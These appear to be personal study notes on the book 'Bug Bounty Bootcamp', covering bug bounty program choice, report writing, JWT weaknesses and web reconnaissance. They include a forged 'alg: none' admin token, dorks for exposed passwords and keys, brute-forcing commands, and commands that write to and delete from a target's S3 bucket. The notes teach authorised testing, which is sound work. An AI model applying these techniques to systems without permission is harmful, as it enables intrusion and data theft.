# Bug Bounty Bootcamp - Vickie Li

## Table of Contents

- [Chapter 1: Picking a Bug Bounty Program](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-1-picking-a-bug-bounty-program)
- [Chapter 2: Sustaining Your Success](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-2-sustaining-your-success)
- [Chapter 3: How the Internet Works](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-3-how-the-internet-works)
- [Chapter 4: Environmental Setup and Traffic Interception](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#environmental-setup-and-traffic-interception)
- [Chapter 5: Web Hacking Reconnaissance](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance)
  - [Google Dorking](https://github.com/Xerips/BookNotes/blob/main/BugBugBountyBootcamp.md#google-dorking)
  - [Scope Discovery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#scope-discovery)
  - [Writing Your Own Recon Scripts](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)
- [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#cross-site-scripting)
- [Chapter 7: Open Redirects](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects)
- [Chapter 8: ClickJacking](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-8-clickjacking)
- [Chapter 9: Cross-Site Request Forgery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-9-cross-site-request-forgery)

### Chapter 1: Picking a Bug Bounty Program

Programs: HackerOne, Bugcrowd, Synack, Cobalt, Intigriti  
History: [Bug Bounty Programs](https://en.wikipedia.org/wiki/Bug_bounty_program)

**Assets:**  
Asset = An application, website, or product that you can hac.  
Pick a program that has assets that play to your strengths, based on your skill set, experience level, and preferences

**Asset Types:**

- **Social Sites and Applications:**

  - Any website where users interact with each other.
  - A lot of potential vulnerabilities due to complexity, high level of user interaction between users and the server
  - Examples: Facebook, Twitter, Github, LINE, Discord
  - Weaknesses:
    - IDORs (Indirect Object Reverences)
    - Info Leaks (directory busting)
    - Account Take Overs (session hijacking)
    - Input validation (SQLi, XSS)
    - Large attack surface
  - Skills Needed:
    - Burpsuite/proxy usage
    - XSS
    - IDOR
    - Useful: JavaScript
  - Downside:
    - Highly targeted
    - Competitive

- **General Web Applications:**

  - Any web application that does not involve user-to-user interaction
  - Users interacts with the server to access application features
  - Low barrier to entry
  - Vary in popularity
  - Examples: Static Websites, Cloud Applications, Consumer Services (Banks, IoT web portals), Google, USDoD, Credit Karma
  - Skills Needed:
    - Server-side vulnerabilities
    - Vulnerabilities specific to the applications tech stack
    - Network vulnerabilities (Subdomain takeovers)
    - Proxy usage
    - Client-side vulnerabilities
    - Useful: Web development, programming
  - Downside:
    - Harder to hack than social Applications
    - Smaller attack surface

- **Mobile Applications (Android, iOS, and Windows):**

  - Specialize in mobile apps only after becoming proficient in hacking web applications
  - Examples: Facebook Messenger, Twitter (X) app, LINE mobile app, Yelp app, Gmail app.
  - Less popular among bug county hunters, less competitive.
  - Skills Needed:
    - Web App hacking
    - Knowledge of structure and programming techniques related to the platform (Android, iOS, Windows, etc.)
    - Attacks and Analysis strategies related to the platform (Certificate pinning bypass, mobile reverse engineering, cryptography)
    - Mobile testing lab setup (Regular device, rooted device, device emulator)
  - Downside:
    - Higher barrier to entry for skill set
    - Higher barrier to entry for equipment/lab setup

- **APIs (Application Programming Interface)**

  - Skills Needed:
    - Web application hacking
    - Mobile app hacking
    - IoT hacking
    - Data leaks
    - Injection flaws

- **Source Code and Executables:**

  - Less competitive, a very small pool of hackers working on these
  - An abundance or type and difficulty
  - Examples: Internet Bug Bounty, PHP language, the WordPress program
  - Skills Needed:
    - Advanced programming
    - Advanced reverse engineering
    - Source code analysis
    - Binary fuzzing
    - Web vulnerabilities
    - Cryptography
    - Software development
  - You don't have to be a master programmer, requires solid understanding of the project's tech stack and architecture

- **Hardware and IoT:**
  - Programs often provide free device to hack
  - Often need a pre-existing relationship with the company
  - The least competitive due to specialized skill set and device access
  - Examples: Cars, Televisions, thermostats, Tesla, Ford
  - Skills Needed:
    - Highly specific to the assets
    - Common IoT vulnerabilities
    - Web vulnerabilities
    - Programming
    - Code analysis
    - Reverse engineering
    - IoT concepts
    - Digital signing
    - Asymmetric encryption schemes
    - Cryptography
    - Wireless hacking
    - Software Development (useful)
  - Downside:
    - Higher skill set barrier to entry
    - May need the money to buy the device(s)

**Bug Bounty Platforms**

- Hosted in two ways:

  1. Bug bounty platform

  - Pros:
    - Transparency into companies
      - Company's process for dealing with reports
      - Disclosed reports
      - Metrics about triage rates, payment amounts, response times
    - Often have reputation systems to showcase experience and gain access to invite-only programs
    - More seamless communication with asset owners
    - Easier to follow up on reports
    - Payment and tax info every time you wubmit a vuln report
    - Bug bounty platforms often step in to provide conflict resolution and legal protection as a third party (getting paid, staying protected)
    - Hacker-to-hacker feedback from platforms is helpful in selecting assets
  - Cons:
    - Reports often get handled by _triagers_ who are often less familiar with a company's products security details (unskilled hackers)
      - Complaints about triagers handling reports improperly are common
    - Platforms break the direct connection between hackers and developers
    - Often more crowded than private bug bounty programs

  2. Independently hosted website

  - Often have direct access to discuss vulnerabilities with security engineers, very valuable learning/networking experience
  - Not a lot of recourse if things go wrong

**Scope, Payouts, and Response Times**

**Program Scope:**

- Defines what and how you are allowed to hack
- Two types of scope:
  1. Asset
  - Which Subdomain
  - Which Products
  - Which Applications
  2. Vulnerability
  - Which vulnerabilities the company will accept as valid bugs
    **Hacking an out-of-scope asset is illegal!!**
- Finding assets with a large scope is a great place for beginners to start
  - The larger the scope, the larger the number of target applications and web pages you can look at
  - Can often find obscure applications that are overlooked by other hackers

**Payout Amounts:**

- VDPs (Vulnerability Disclosure Programs)
  - Reputation only (no payment)
  - Great for learning if you don't need money right away
  - Less competitive, easier to find bugs
  - Still can offer interaction with security engineers for learning/networking
- Bug Bounty Programs
  - Pay per Vulnerability
  - The more critical the vulnerability, the higher the payment
  - low-impact ~$50-$500
  - Critical issues $10,000+
    - This has been increasing over time
    - Apple pays up to $1,000,000 for more sever vulnerabilities

**Response Time:**

- Prioritize programs that have fast response times
  - As a beginning you will make mistakes and having fast response times helps to be able to learn and move on as soon as possible

**Private Programs**

- Open to invited hackers only
- Hackers are selected based on skill set, track record, reputation, etc.
- Much less competitive once in
- Not incredibly difficult to get private invites once you've found a few bugs.
- Tips:
  - Submit a few bugs to public programs
  - Focus on increasing reputation points
  - Go for the highest impact bugs, chain low impact bugs to escalate
  - HackerOne: complete tutorials and solve Capture the Flag challenges
  - Don't spam
  - Be polite and courteous when dealing with security teams

**Choosing the Right Program**

- Pick a program you can succeed in from the start
  - Pick programs that more experience bug hunters pass over to avoid competition
  - Look for unpaid programs or go for programs with BIG scopes
  - Start with VDPs move to large scope increase rep for private invites
  - Dig into the company's process through disclosed Reports
    - Does the company treat its reporters well?
    - Are they respectful and supportive?
    - Do they help you learn?

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 2: Sustaining Your Success

1. Craft a Descriptive Title

- Aim for a one sentence title that sums up the issue.
- Things to consider for the title:
  - What the vulnerability is
  - Where it occurred
  - The potential severity
- Example:
  - Instead of "IDOR on Critical Endpoint"
  - "IDOR on https://example.com/change_password Leads to Account Takeover for All Users."

2. Provide a Clear Summary

- Should contain all of the information you couldn't fit in the title
  - example:
    `The https://example.com/change_password endpoint takes two POST body parameters: user_id and new_password. A Post request to this endpoint would change the password of user_id to new_password. This endpoint is not validating the user_id parameter, and as a result, any user can change anyone else's password by manipulating the user_id parameter.`

3. Include a Severity Assessment

- Ratings should be given in one line:
  - "Severity of the issue: High"
- Don't over or under state the severity
- Severity Rankings:

  - Low: The bug doesn't have the potential to cause a lot of damage. For example, an open redirect that can be used only for phishing is a low-severity bug.
  - Medium: The bug impacts users or the organization in a moderate way, or is a high-severity issue that's difficult for a malicious hacker to exploit. The security team should focus on high- and critical-severity bugs first. For example, a cross-site request forgery (CSRF) on a sensitive action such as password change is often considered a medium-severity issue.
  - High: The bug impacts a large number of users, and its consequences can be disastrous for these users. The security team should fix a high-severity bug as soon as possible. For example, an open redirect that can be used to steal OAuth tokens is a high-severity bug.
  - Critical: The bug impacts a majority of the user base or endagers the organization's core infrastructure. The security team should fix a critical-severity bug right away. For example, a SQL injection leading to remote code execution (RCE) on the production server will be considered a critical issue.

- Resources for researching severity:
  - [Common Vulnerability Scoring System (CVSS)](https://www.first.org/cvss)
  - [Bugcrowd's rating system](https://bugcrowd.com/vulnerability-rating-taxonomy)
  - [HackerOne](https://docs.hackerone.com/hackers/severity.html)

4. Give Clear Steps to Reproduce

- Bad Example:

1. Login to the site and visit https://example.com/change_password
2. Click the Change Password button
3. Intercept the request, and change the user_id parameter to another user's ID.

- Better Example:

1. Make two accounts on example.com: account A and account B.
2. Log in to example.com as account A, and visit https://example.comd/change_password
3. Fill in the desired new password in the new password field, located at the top left of the page.
4. Click the Change Password button located at the top right of the page
5. Intercept the POST request to https://example.com/change_password and change the user_id POST parameter to the user ID of account B.
6. You can now log in to account B by using the new password you've chosen.`

7. Provide a Proof of Concept

- The steps to reproduce may be sufficient for some bugs
- When bugs are more complex it may be helpful to include video, screenshots, or photos documenting your exploit in a POC file
- Examples:
  - Include an HTML file with the CSRF payload embedded. This way the only thing the security team needs to do is to open the HTML file in their browser.
  - For an XML external entity attack, include the crafted CML file that you used to execute the attack
  - For a vulnerability that requires multiple steps to reproduce, provide a screen capture of you walking through the process
  - Saving the security team time by providing payloads will help turn around time and help build a relationship
  - Provide any files, exploits, scripts, or upload files used in the exploit is best practice

6. Describe the Impact and Attack Scenarios

- The severity assessment (CVSS) describes the severity of the consequences of an attacker exploiting the vulnerability, whereas the attack scenario explains what those consequences would actually look like.
- Example:
  - `Using this vulnerability, all that an attacker needs in order to change a user's password is their user_id. Since each user's public profile page lists the account's user_id, anyone can visit any user's profile, find out their user_id, and change their password. And because user_ids are simply sequential numbers, a hacker can even enumerate all the user_ids and change the passwords of all users! This bug will let attackers take over anyone's account with minimal effort.`
  - The Impact section should take into account any mitigating factors as well as the maximum impact that can be achieved
  - It should never overstate a bug's impact or include any hypotheticals

7. Recommend Possible Mitigations

- Only provide possible mitigations if you can be clear and confident in explaining them
- If you're unsure avoid giving suggestions to avoid confusing the security team
- Example:
  - `The application should validate the user's user_id parameter within the change password request to ensure that the user is authorized to make account modifications. Unauthorized request should be rejected and logged by the application`

8. Validate the Report

- Proof read the report
- Recreate the bug by following your report
- Ensure all POC files are correct

#### **Understanding Why You're Failing**

**You participate in the Wrong Programs**

- Read publicly disclosed reports, analyze program statistics on bug bounty platforms, or talk with other hackers
  - You may be working with a company that is difficult or only lists on bug bounty platforms for publicity and don't intend to use the service
- Avoid programs with long response times and programs with low average bounties
- Pick targets carefully and prioritize companies that invest in their bug bounty Programs

**You Don't Stick to a program**

- Dig deep or search wide
  - dig deep into a single function of an application
  - search wide to find lesser known assets of the company

**You Don't Recon**

- Recon with the idea of finding new attack surfaces: new subdomains, new endpoints, and new functionality
- Finding buried treasure is a great way to avoid duplicates or competition

**You go for Only Low-Hanging Fruit**

- Using vulnerability scanners can be pretty useless. Both other hackers and the company themselves will be using vuln scanners too.
- Simplistic bugs have usually already been reported on big projects. This is because many of them have been private before they go public.
- Should still look for low-hanging fruit, but don't be discouraged or stop when you don't find anything

**You don't get into private programs**

- Most bug bounty hunters report gaining most of their rewards through private programs. Make sure you respond!

#### **What to Do When You're Stuck**

1. Take a Break!
2. Build Your Skill Set

- [OWASP](https://owasp.org/www-project-web-security-testing-guide) has testing guides that can help you build your skills towards what's most common
- Play CTFs

3. Gain a Fresh Perspective

- Diversify your targets to break up the monotony
- Look for specific things, when whose don't work, look for other specific things

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 3: How the Internet Works

**The Client-Server Model**

- The internet is composed of two kinds of devices: Clients and Servers.
  - Clients request resources
  - Servers provide resources
- Web servers provide:
  - HTML files to your browser to display information
  - CSS files to make that display information pretty
  - JavaScript to which enables animation, reacts to use input, resizing of of images as you scroll, validation of user input on the client side all before interacting with the server. JavaScript can also display images and videos
  - Web APIs enable applications to request the data of other systems

**The Domain Name System (DNS)**

- Functions as the phone book for the internet by translating domain names into IP addresses.  
  Example:  
   Browser -- "Where is google.com?" --> DNS server  
   DNS server -- "It's at 216.58.192.132" --> Browser  
   Browser -- "Show me google.com" --> Web Server 216.58.192.132  
   Web Server 216.58.192.132 -- "here you go, google.com" --> Browser

  **Internet Ports**

- You connect to a server through a port which range in number from 0 to 65,535
- Users connect to a server through a port which is mapped to a specific service
  - This makes sending and receiving information more efficient as conventions allows for this information to all be processed in the same way
  <pre>
  Example:                  port 80 - HTTP service  
                          /  
  browser --> web server -- port 25 - Email service  
                          \  
                            port 21 - ftp service  
  </pre>

**Requests and Responses**

- HTTP is a set of rules that specifies how to structure and interpret internet messages and how web clients and web servers should exchange info
- Types of HTTP requests:
  - GET: Retrieves information from the server
  - POST: Submits data to the server
  - OPTIONS: Requests permitted HTTP methods
  - PUT: Used to update a resource
  - DELETE: Used to delete a resource
- Examples of very simple HTTP requests and responses on page 36-37 (simplistic)

#### **Internet Security Controls**

**Content Encoding**

- Data encoding is not just used to privacy or security, it is also used to prevent data corruption
- Used to transfer binary data reliably across machines that have limited support for different content types
- When you transfer data without encoding, data may be screwed up when the internet protocols misinterpret special characters in the message
- Common Data Encoding methods:
  - Base64
  - Hex
  - URL encoding
  - Octal encoding
  - dword encoding
  - Whenever you see encoded data try to decode it to understand what the website is trying to communicate
- Tools for encoding/decoding:
  - Burpsuite
  - [Cyber Chef](https://gchq.github.io/CyberChef)
- When servers encrypt their content before transmission, the data between the client and server is secured against intercepts and eavesdropping

**Session Management and HTTP Cookies**

- Session management is the process that allows the server to handle multiple requests from the same user without asking the user to log in again
- When you log in, the server creates a new session and assigns an associated session ID to your browser that serves as proof of identity
  - Session ID's are often long and unguessable
- When you log out, the server ends the session and revokes the session ID. Session ID's may also be ended if you don't manually logout (timeout)
- Most websites use cookies to communicate session information in HTTP Requests
  - These cookies are stored in your browser
- When you log in later, a new session ID is created and sent to your browser

**Token-Based Authentication**

- Token-based authentication systems store your session ID info directly in some sort of token.
  - Instead of storing your information server-side and querying it using a session ID, tokens allow servers to deduce your identity be decoding the token itself.
  - This way applications won't have to store and maintain session information server-side
- **Risk:** If the server uses information contained in the token to determine the user's identity, couldn't users modify the information in the tokens and log in as someone else?
  - To combat token forgery, applications might encrypt their tokens, or encode the token so that it can be read by only the application itself or other authorized parties
  - This does not completely eliminate the risk of token forgery. It's harder but attackers can tamper with encrypted tokens without understanding the contents. Encoded tokens can also be decoded to read the contents
  - Signing tokens is a more reliable way to prevent token tampering as only the system with the secret signing key can generate the signature
    Example:

1. The user logs in with their credentials.
2. The server validates those credentials and provides the user with a signed token.
3. The user sends the token with every request to prove their identity.
4. Upon receiving and validating the token, the server reads the user's identity information from the token and responds with confidential data.

**JSON Web Tokens**

- JSON web token is one of the most commonly used types of authentication tokens and it has three components:
  1. A header:
  - Identifies the algorithm used to generate the signature
  - It's a base64url-encoded string containing the algorithm name
  - ex. eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K
  - ex. decoded: { "alg" : "HS256", "typ" : "JWT" }
  2. A payload:
  - Contains information about the user's identity
  - It's a base64url-encoded string containing the algorithm name
  - ex. eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg
  - ex. decoded: { "user_name" : "admin", },
  3. A signature
  - Calculated by concatenating the header with the payload, then signing it with the algorithm specified in the header, and a secret key
  - ex. 4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M
  - Created by signing: eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg with HS256 algorithm using the secret key
  - The whole token is made up of each part separated by a period: eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg.4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M
  - If done incorrectly, there are ways to bypass the security mechanism and forge arbitrary Tokens

**Manipulating the alg Field**

- Sometimes applications fail to verify a token's signature after it arrives at the server allowing an attacker to bypass the security mechanism by providing an invalid or blank signature
- Attackers do this by tampering with the "alg" field of the token header
  - Applications must restrict the algorithm type used in the JWT to stop attackers from compromising the security of the token through tampering with the "alg" field
  - If the alg field is able to be set to `none` even tokens with empty signature sections would be considered valid
  - example:
    - { "alg" : "none", "typ" : "JWT" } { "user_name" : "admin" }
    - = eyAiYWxnIiA6ICJub25lIiwgInR5cCIgOiAiSldUIiB9.eyAidXNlcl9uYW1lIiA6ICJhZG1pbiIgKQ.
- Allowing the alg field to be set to `none` was originally used for debugging, but if left on attackers can bypass security and log in as anyone
- HMAC and RSA are the most popular signing algorithms
  - If an RSA algo is being used, and the attacker can switch the "alg" field to HMAC, they might be able to create valid tokens by signing the forged tokens with the RSA public key
    - When the field is switched to HMAC the token is still verified with the RSA public key, but this time, they token can be signed with the same public key.

**Brute-Forcing the key**

- Attackers have a lot of information to start with: the algorithm used to sign the token, the payload that was signed, and the resulting signature
- If the key used to sign the token is not complex enough, it might be possible to brute-force it
- If another vulnerability exists (Directory Traversal, external entity attack (XXE), or server side request forgery (SSRF)) that allows the attacker to read the file where the key value is stored, the attacker can steal the key and sign arbitrary tokens of their choosing

**Reading Sensitive Information**

- JWT's often contain sensitive user information, if they aren't encrypted attackers can decode them to access sensative user information
- Properly implemented signature sections provide data integrity, not confidentiality
- Search JWT security issues or vulnerabilities for more examples

**The Same-Origin Policy**

- Same-Origin Policy (SOP) is a rule that restricts how a script from one origin can interact with the resources of a different origin.
  - A script from page A can access data from page B only if the pages are of the same origin
  - This rule protects modern web applications and prevents many common web vulnerabilities
- Two URLs are said to have the same origin if they share the same protocol, hostname, and port number

**Learn to program**

- Learning python or bash can help you automate repetitive tasks and safe lots of time
- Learning to read JavaScript can help you find hidden endpoints that may be vulnerable
- Recommended books:
  - _Learn Python the Hard Way_ by Zed Shaw
  - _Eloquent JavaScript, Third Edition_ by Marijn Haverbeke

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 4: Environmental Setup and Traffic Interception

The setup section is very basic and only necessary if you've never used BurpSuite and don't have a setup for pen testing already.

**A Final Note on... Taking Notes**

- Stay organized
- Keep track of what you've tested and what you've yet to test (regardless of success)
  - Don't waste your time accidentally testing the same things
- Record details about each vulnerability:
  - theoretical concept, potential impact, exploitation steps, and sample proof-of-concept code
- Possible note taking tech:
  - Obsidian (Mark down, brain mapping)
  - XMind (mind mapping tool)
  - \*CherryTree (hierarchical note taking, good for searching through your notes and building large note bases)
  - \*NeoVim (Cuz why not? I use it for everything else)
- Note taking tips:
  - Take notes about any weird behaviors, new features, misconfigurations, minor bugs, and suspicious endpoints to keep track of potential vulnerabilities
  - Take notes to keep track of your hacking progress, the features you've tested, and those you stil have to check
  - Take notes while you learn: jot down information about each vulnerability you learn about, like its theoretical concept, potential impact, exploitation steps, and sample POC code.
  - Keep you notes organized from the get-go, so you can find them when you need to!
  - Find a note-taking and organization process that works for you, You can try out note-taking tools like Sublime Text, Obsidian, and XMind to find a tool that you prefer.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 5: Web Hacking Reconnaissance

**Manually Walking Through the Target**

- Try to use every function the website has to offer: payments, events, create different users with different privileges, click all the links and see where they go, etc.
- You're exploring the attack surface

#### Google Dorking

- Advanced google searches are a powerful technique to find the resources you need quickly and accurately.
- Can be used for recon or finding POCs, Payloads, etc.
- Can be used for finding hidden admin portals, unlocked password files, and leaked authentication keys.

**Google Dorking Operators:**

- **_site_**:
  - Tells Google to show you results from a certain site only.
  - ex.: to show results for print() only from python.org
    - print() site:python.org
- **_inurl_**:

  - Searches for pages with a URL that match the search string.
  - ex.: You've just learned that "/course/jumpto.php" could indicate that a site is vulnerable to RCE.
    - You can then search: inurl:"/course/jumpto.php" site:example.com
  - ex.: Search for possibly vulnerable endpoints like a Kibana dashboard:
    - site:example.com inurl:app/kibana

- **_intitle_**:
  - Finds specific strings in a page's title.
  - ex.: You want to search for file-listing pages on a web server and know that they often have "index of" in their titles.
    - intitle:"index of" site:example.com
- **_link_**:
  - Searches for web pages that contain links to a specified URL.
  - ex.: You're researching the common regular expression denial-of-service (ReDos) vulnerability. You can easily pull up its definition but might have a hard time finding examples. The link operator can discover pages that reference the vulnerability's Wikipedia page to find discussions on the topic
    - link:"https://en.wikipedia.org/wiki/ReDos"
- **_filetype_**
  - Searches for pages with a specific file extension. Use it to find files with extensions like .log, .php, .pwd, etc.
    - filetype:log site:example.com
- **_Wildcard(\*)_**
  - Used to indicate "Any character or series of characters."
  - ex.: Replace a word in a search to find all possible matches that could replace that word.
    - "How to hack \* using Google"
    - This will result in results like: "How to hack _websites_ using Google," "How to hack web apps using Google," "How to hack (ext.) using Google."
  - ex. Search for all of a targets sub domains:
    - site:\*.example.com
- **_Quotes (" ")_**
  - Adding quotations around your search terms forces an exact match.
  - ex.: Force searches to contain all the words "How to hack," by putting them in quotes.
    - This will not guarantee that the words will be in the order of your quoted text.
- **_Or (|)_**
  - Pipe character = "or"
  - | must be surrounded by spaces
  - ex.: Search for "how to hack" on two different sites:
    - "how to hack" site:(reddit.com | stackoverflow.com)
  - ex.: Search for results containing either SQLi or SQL injection:
    - (SQLi | SQL injection)
- **_Minus (-)_**
  - Used to exclude search results
  - ex.: You want to search "how to hack" but exclude php hacking:
    - "how to hack websites" -php
- **_ext_**
  - similar to filetype, but will look specifically for file extensions (not file types) like .php, .cfm, .asp, .jsp, .pl
  - ex.:
    - site:example.com ext:php
    - site:example.com ext:txt password

[Google Hacking Database](https://www.exploit-db.com/google-hacking-database/) contains many search queries that could be helpful including queries that look for files containing passwords, common URLs of admin portals, pages build using vulnerable software.
**If you're sending a lot of search queries, Google will start requiring CAPTCHA challenges for visitors from your network. Don't slow down everone else using google on your network, use a VPN/VPS to a different network if you think this may happen.**

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

#### Scope Discovery

Always verify the target's scope which specifies which subdomains, products, and applications you're allowed to attack.  
If dev.example.com and test.example.com are out of scope, manually test around them, or exclude them when using tools that might touch these subdomains.

**WHOIS and Reverse WHOIS**
Use whois to obtain information like: mailing address, phone number, email address, names, etc.

- ex.: whois facebook.com
  For companies using _domain privacy_ you can use a reverse whois for finding more obscure information or internal domains.
- Use ViewDNS.info (or another public tool) for reverse whois
  Between whois and reverse whois you'll have a good set of top-level domains to work with.

**IP Addresses**

- Use nslookup to find the IP address associated with a domain.
  - `$ nslookup facebook.com`
- Use whois with the IP and look for the NetRange to see what range of IP addresses (range) belong to the target. If they have a range, all IP addressed within that range belong to the target.
- You can compare Autonomous System Numbers (ASNs) to see if multiple IPs belong to the same owner as well.
- ex.:
- `whois -h whois.cymru.com 157.240.2.20`
  AS | IP | AS Name  
  32934 | 157.240.2.20 | FACEBOOK, US
- `whois -h whois.cymru.com 157.240.2.27`
  AS | IP | AS Name  
  32934 | 157.240.2.27 | FACEBOOK, US
- The -h flag in the whois command sets the WHOIS server to retrieve information from, and whois.cymru.com is a database that translates IPs to ASNs. If the company has a dedicated IP range, and doesn't mark those addresses as out of scope, you could plan to attack every IP in that range.

**Certificate Parsing**

- An SSL certificate's Subject Alternative Name field allows cert owners to specify additional hostnames that use the same certificate. You can find those hostnames by parsing this field.
- Online Databases: crt.sh, Cert Spotter, Censys
- crt.sh can send information in JSON format, rather than HTML, for easier parsing.
  - For JSON, you can change the request to `curl https://crt.sh/?q=facebook.com&output=json`

**Subdomain Enumeration**
Tools:

- Sublist3r: Works by querying search engines and online subdomain databases.
- SubBrute: Brute-forcing tool that guesses possible subdomains until it finds ones that exist.
- Amass: Uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases.
- Gobuster: Another brute-forcing and fuzzing tool.
- [Altdns](https://github.com/infosec-au/altdns/): Automates the process of discovering subdomains with names that are permutations of other subdomains.
  Wordlists:
- Daniel Miessler's [SecLists](https://github.com/danielmiessler/SecLists/) - Gotta have it, it's extensive and well organized.
- Word list Generation:
  - [Commonspeak2](https://github.com/assetnote/commonspeak2/)
  - [CeWL](https://github.com/digininja/CeWL)
    Tips, Tricks, Usages:
- Use `sort -u wordlist1.txt wordlist2.txt -o hybridlist.txt` to remove duplicate entries in 2 wordlists.
- Gobuster subdomain brute-forcing: `gobuster dns -d target_domain -w wordlist`
- Use knowledge of the target to check for possible subdomains.
  - ex.: you know example.com uses jenkins, check jenkins.example.com to see if it's a valid subdomain.
- look for subdomains of subdomains: found dev.example.com, try also for 1.dev.example.com, etc.
  - recursively check for subdomains by brute forcing your found domains (again and again until no returns).

**Service Enumeration**
Tools:

- nmap: Active Scanning
- masscan: Active Scanning
- Shodan: Passive Scanning
- Censys: Passive Scanning
- Projects Sonar: Passive Scanning

- Active scanning is where your system directly interacts with the target system to check if certain ports are open. Can be seen and you could have your IP address blocked, or logged, etc.
- Passive Scanning is where you use a 3rd party to scan the target. This is a way to get information without touching the target.
- The book doesn't go into it (at least in this chapter), but nmap and masscan have a huge amount of functionality. Take a look at the documentation, tutorials, etc. to help build your own commands to create custom enumeration commands for different targets/scenarios.

**Directory Brute-Forcing**

- dirsearch example:
  - `dirsearch -u scanme.nmap.org -e php`
  - -u is the flag for the url you're dir busting, -e is the file extensions you're looking for. You can run it with multiple file extensions.
- gobuster example:
  - `gobuster dir -u target_url -w wordlist`
  - dir to specify directory busting (in contracts to the earlier dns), -u to specify the target url, -w to pass the wordlist.
    Tips and Tricks:
- Use a screenshot tool like [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness/) or [Snapper](https://github.comdxa4481/Snapper) to automatically verify that a page is hosted on each location
- EyeWitness accepts a list of URLs and takes screenshots of each page. Quickly cycle through images in an image gallery app to see if anything looks interesting.
  - Look for: Developer or Admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained.

**Spidering the Site**

- A web spider tool visits a page, then identifies all the URLs embedded on the page and visits them, then repeats the process.
  - This can uncover hidden endpoints in an application.
    Tools:
- OWASP Zed Attack Proxy (ZAP): Book recommends ZAP for spidering over BurpSuite. Pg. 72 for examples.
- BurpSuite: Uses the "crawler" function to perform spidering/web crawling

**Third-Party Hosting**

- Take a look at the targets third-party hosting footprint.
- Look for S3 buckets (AWS) which stands for Simple Storage Service
  - S3 buckets can contain hidden endpoints, logs, credentials, user information, source code, and other information that might be useful.
- Use Google Dorking
  - `site:s3.amazonaws.com COMPANY_NAME` and
  - `site:amazonaws.com COMPANY_NAME`
  - Naming convention: BUCKET.s3.amazonawes.com or s3.amazonaws.com/BUCKET
  - For targets with custom URLs for S3 buckets:
    - `amazonaws s3 COMPANY_NAME`
    - `amazonaws bucket COMPANY_NAME`
    - `amazonaws COMPANY_NAME`
    - `s3 COMPANY_NAME`
- You can use [GreyhatWarfare](https://buckets.grayhatwarfare.com) to search publicly exposed S3 buckets using a keyword.
  - Supply keywords related to your target, such as the application, project, or organization name, to find relevant buckets.
- [Lazys3](https://github.com/nahamsec/lazys3/) is a tool that helps to bruteforce S3 buckets using a wordlist to guess permutations of common bucket names.
- [Bucket Stream](https://github.com/eth0izzle/bucket-stream/) parses certificates belonging to an organization and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also checks whether the bucket is accessible to save you time.

- You'll need to install awscli to interact with buckets you've found: `pip install awscli`
- Configuration documentation can be found at https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.

Usage:

- list the contents of a bucket you've found with:
  - `aws s3 ls s3://BUCKET_NAME/`
- Copy files to your local machine:
  - `aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory`
- Look for anything valuable such as active API keys, personal information, passwords, etc. Report these right away.
  - Exposed s3 buckets alone are often considered vulnerabilities.
- Copy a local file to the targets s3 bucket:
  - `aws s3 cp TEST_FILE s3://BUCKET_NAME/TEST_FILE`
- Remove the TEST_FILE with:
  - `aws s3 rm s3://BUCKET_NAME/TEST_FILE`
- If you can mess with the contents of an s3 bucket, you may be able to change the web application's operations or corrupt data.
- It's best to upload a "I Wuz Here" file and remove it to prove you have access, tampering with company files may result in costly lawsuits.

**GitHub Recon**

- Find the github user names associated with your target by searching the organizations name or product names or by checking the github accounts of known employees
- Find repositories related to the projects you're testing and record them, along with the usernames of the organization's top contributors, which can help you find more relevant repositories.
- Look through the Issues and Comments sections for potential info leaks, unresolved bugs, problematic code, and the most recent code fixes and security patches.
  - New patches are more likely to contain bugs
- Look at any protection mechanisms implemented to see if you can bypass them.
- Once you've found a interesting file, check the Blame and History sections at the top-right corner of the file's page to see how it was developed
- Look for hardcoded secrets like API keys, encryption keys, database passwords
- Use [Key Hacks](https://github.com/streaak/keyhacks/) to check if the creds are valid and learn how to use them to access the target's services
- Look for functions that deal with authentication, password reset, state-changing actions, or private info reads.
